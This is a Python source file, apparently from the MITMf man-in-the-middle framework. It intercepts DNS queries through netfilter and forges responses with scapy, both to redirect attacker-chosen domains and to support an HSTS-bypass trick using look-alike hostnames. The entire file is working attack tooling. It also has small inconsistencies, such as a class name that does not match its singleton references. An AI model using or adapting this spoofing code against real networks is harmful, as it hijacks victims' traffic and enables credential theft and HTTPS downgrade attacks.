
class DNSnfqueue():

	hsts      = False
	dns       = False
	hstscfg   = None
	dnscfg    = None
	_instance = None
	nfqueue   = None
	queue_number = 0

	def __init__(self):
		self.nfqueue = NetfilterQueue()
		t = threading.Thread(name='nfqueue', target=self.bind, args=())
		t.setDaemon(True)
		t.start()

	@staticmethod
	def getInstance():
		if _DNS._instance is None:
			_DNS._instance = _DNS()

		return _DNS._instance

	@staticmethod
	def checkInstance():
		if _DNS._instance is None:
			return False
		else:
			return True

	def bind(self):
		self.nfqueue.bind(self.queue_number, self.callback)
		self.nfqueue.run()

	def stop(self):
		try:
			self.nfqueue.unbind()
		except:
			pass

	def enableHSTS(self, config):
		self.hsts = True
		self.hstscfg = config

	def enableDNS(self, config):
		self.dns = True
		self.dnscfg = config

	def resolve_domain(self, domain):
		try:
			mitmf_logger.debug("Resolving -> %s" % domain)
			answer = dns.resolver.query(domain, 'A')
			real_ips = []
			for rdata in answer:
				real_ips.append(rdata.address)

			if len(real_ips) > 0:
				return real_ips

		except Exception:
			mitmf_logger.info("Error resolving " + domain)

	def callback(self, payload):
		try:
			#mitmf_logger.debug(payload)
			pkt = IP(payload.get_payload())

			if not pkt.haslayer(DNSQR):
				payload.accept()
				return

			if pkt.haslayer(DNSQR):
				mitmf_logger.debug("Got DNS packet for %s %s" % (pkt[DNSQR].qname, pkt[DNSQR].qtype))
				if self.dns:
					for k, v in self.dnscfg.items():
						if k in pkt[DNSQR].qname:
							self.modify_dns(payload, pkt, v)
							return

					payload.accept()

				elif self.hsts:
					if (pkt[DNSQR].qtype is 28 or pkt[DNSQR].qtype is 1):
						for k,v in self.hstscfg.items():
							if v == pkt[DNSQR].qname[:-1]:
								ip = self.resolve_domain(k)
								if ip:
									self.modify_dns(payload, pkt, ip)
									return

						if 'wwww' in pkt[DNSQR].qname:
							ip = self.resolve_domain(pkt[DNSQR].qname[1:-1])
							if ip:
								self.modify_dns(payload, pkt, ip)
								return

						if 'web' in pkt[DNSQR].qname:
							ip = self.resolve_domain(pkt[DNSQR].qname[3:-1])
							if ip:
								self.modify_dns(payload, pkt, ip)
								return

					payload.accept()

		except Exception, e:
			print "Exception occurred in nfqueue callback: " + str(e)

	def modify_dns(self, payload, pkt, ip):
		try:
			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
			UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
			DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd)

			if self.hsts:
				spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip[0]); del ip[0] #have to do this first to initialize the an field
				for i in ip:
					spoofed_pkt[DNS].an.add_payload(DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=i))
				mitmf_logger.info("%s Resolving %s for HSTS bypass (DNS)" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
				payload.set_payload(str(spoofed_pkt))
				payload.accept()

			if self.dns:
				spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip) 
				mitmf_logger.info("%s Modified DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
				payload.set_payload(str(spoofed_pkt))
				payload.accept()
		
		except Exception, e:
			print "Exception occurred while modifying DNS: " + str(e)